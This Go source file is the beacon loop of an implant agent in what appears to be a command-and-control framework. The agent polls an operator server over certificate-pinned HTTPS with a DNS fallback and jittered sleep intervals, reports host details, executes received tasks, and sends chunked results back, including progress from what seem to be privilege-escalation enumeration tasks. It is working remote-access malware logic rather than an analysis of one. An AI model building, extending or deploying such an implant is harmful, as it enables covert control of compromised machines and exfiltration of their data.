package agent

import (
	"log"
	"math/rand"
	"os"
	"runtime"
	"strconv"
	"sync/atomic"
	"time"

	"github.com/aelder202/sable/internal/protocol"
)

// interactiveMode is set to 1 by the "interactive start" task so the beacon
// loop polls at the fast interval instead of the configured sleep interval.
var interactiveMode int32

// pathBrowseFastUntil stores a unix-nano deadline used to keep remote path
// browsing responsive after the operator opens the path browser.
var pathBrowseFastUntil int64

var backgroundTaskCount int32

const (
	fastBeaconInterval   = 100 * time.Millisecond
	pathBrowseFastWindow = 2 * time.Minute
	failureLogInterval   = time.Minute
	resultChunkBytes     = 512 * 1024
	asyncResultQueueSize = 4096
)

var (
	beaconNonceFn     = protocol.RandomNonce
	sendBeaconHTTPSFn = sendBeaconHTTPS
	sendBeaconDNSFn   = sendBeaconDNS
	asyncResults      = make(chan *protocol.TaskResult, asyncResultQueueSize)
)

// Run starts the beacon loop. It blocks until a kill task is received or the process exits.
func Run(cfg *Config) {
	client := newPinnedClient(cfg.CertFingerprint)
	var pendingResults []*protocol.TaskResult
	consecutiveFailures := 0
	var lastFailureLog time.Time
	skipSleep := false

	for {
		// Skip the sleep when we have a fresh result to deliver, so the output
		// reaches the server on the very next beacon rather than after a full
		// sleep cycle. Normal idle beacons still sleep as configured.
		if !skipSleep {
			if fastBeaconActive() {
				time.Sleep(fastBeaconInterval)
			} else {
				base := time.Duration(cfg.SleepSeconds) * time.Second
				jitter := time.Duration(rand.Int63n(int64(base / 5))) //nolint:gosec // jitter doesn't need crypto rand
				time.Sleep(base + jitter)
			}
		}
		skipSleep = false

		if len(pendingResults) == 0 {
			if result := nextAsyncResult(); result != nil {
				pendingResults = append(pendingResults, chunkTaskResult(result)...)
			}
		}

		nonce, err := beaconNonceFn()
		if err != nil {
			continue
		}

		var pendingResult *protocol.TaskResult
		if len(pendingResults) > 0 {
			pendingResult = pendingResults[0]
		}
		beacon := &protocol.Beacon{
			AgentID:    cfg.AgentID,
			Timestamp:  time.Now().Unix(),
			Nonce:      nonce,
			Hostname:   hostname(),
			OS:         runtime.GOOS,
			Arch:       runtime.GOARCH,
			TaskOutput: pendingResult,
		}

		encoded, err := protocol.EncodeBeacon(beacon, cfg.Secret)
		if err != nil {
			continue
		}

		respBytes, err := sendBeaconHTTPSFn(client, cfg.ServerURL, encoded)
		if err != nil {
			if cfg.DNSDomain != "" {
				respBytes, err = sendBeaconDNSFn(encoded, cfg.DNSDomain)
				if err != nil {
					consecutiveFailures++
					suspendPathBrowseOnFailure()
					logBeaconFailure("beacon failed (https+dns)", err, consecutiveFailures, &lastFailureLog)
					continue
				}
			} else {
				consecutiveFailures++
				suspendPathBrowseOnFailure()
				logBeaconFailure("beacon failed", err, consecutiveFailures, &lastFailureLog)
				continue
			}
		}
		if consecutiveFailures > 0 {
			log.Printf("beacon recovered after %d failed attempt(s)", consecutiveFailures)
			consecutiveFailures = 0
			lastFailureLog = time.Time{}
		}

		// Only clear the pending result after the server has acknowledged the beacon.
		// This preserves the audit trail across transient transport failures.
		if pendingResult != nil {
			pendingResults = pendingResults[1:]
			if len(pendingResults) > 0 {
				skipSleep = true
			}
		}

		task, err := protocol.DecodeTask(respBytes, cfg.Secret)
		if err != nil || task.Type == "noop" {
			continue
		}

		if task.Type == "sleep" {
			if secs, err := strconv.Atoi(task.Payload); err == nil && secs > 0 {
				cfg.SleepSeconds = secs
			}
			continue
		}

		result := executeTask(task)
		pendingResults = append(pendingResults, chunkTaskResult(result)...)

		if task.Type == "kill" {
			return
		}

		// Deliver the result on the next beacon without sleeping first.
		skipSleep = true
	}
}

func chunkTaskResult(result *protocol.TaskResult) []*protocol.TaskResult {
	if result == nil || result.Error != "" || len(result.Output) <= resultChunkBytes {
		return []*protocol.TaskResult{result}
	}

	total := (len(result.Output) + resultChunkBytes - 1) / resultChunkBytes
	chunks := make([]*protocol.TaskResult, 0, total)
	for i := 0; i < total; i++ {
		start := i * resultChunkBytes
		end := start + resultChunkBytes
		if end > len(result.Output) {
			end = len(result.Output)
		}
		chunks = append(chunks, &protocol.TaskResult{
			TaskID:     result.TaskID,
			Type:       result.Type,
			Output:     result.Output[start:end],
			ChunkIndex: i,
			ChunkTotal: total,
		})
	}
	return chunks
}

func nextAsyncResult() *protocol.TaskResult {
	select {
	case result := <-asyncResults:
		return result
	default:
		return nil
	}
}

func queueAsyncResult(result *protocol.TaskResult) {
	if result == nil {
		return
	}
	asyncResults <- result
}

func queueAsyncProgress(taskID, message string) {
	queueAsyncTypedProgress(taskID, "peas_progress", "peas", message)
}

func queueAsyncTypedProgress(taskID, resultType, label, message string) {
	if message == "" {
		return
	}
	progressID := taskID + "-" + label + "-" + time.Now().UTC().Format("150405.000000000")
	select {
	case asyncResults <- &protocol.TaskResult{
		TaskID: progressID,
		Type:   resultType,
		Output: message,
	}:
	default:
		log.Printf("dropping %s progress for %s: async result queue full", label, taskID)
	}
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func fastBeaconActive() bool {
	if atomic.LoadInt32(&interactiveMode) == 1 {
		return true
	}
	if atomic.LoadInt32(&backgroundTaskCount) > 0 {
		return true
	}
	return pathBrowseFastActive()
}

func pathBrowseFastActive() bool {
	deadline := atomic.LoadInt64(&pathBrowseFastUntil)
	return deadline > 0 && time.Now().Before(time.Unix(0, deadline))
}

func extendPathBrowseFastWindow() {
	atomic.StoreInt64(&pathBrowseFastUntil, time.Now().Add(pathBrowseFastWindow).UnixNano())
}

func stopPathBrowseFastWindow() {
	atomic.StoreInt64(&pathBrowseFastUntil, 0)
}

func suspendPathBrowseOnFailure() {
	if atomic.LoadInt32(&interactiveMode) == 0 && pathBrowseFastActive() {
		stopPathBrowseFastWindow()
	}
}

func logBeaconFailure(prefix string, err error, failures int, lastLog *time.Time) {
	now := time.Now()
	if failures == 1 {
		log.Printf("%s: %v", prefix, err)
		*lastLog = now
		return
	}
	if now.Sub(*lastLog) >= failureLogInterval {
		log.Printf("%s; still failing after %d attempts: %v", prefix, failures, err)
		*lastLog = now
	}
}
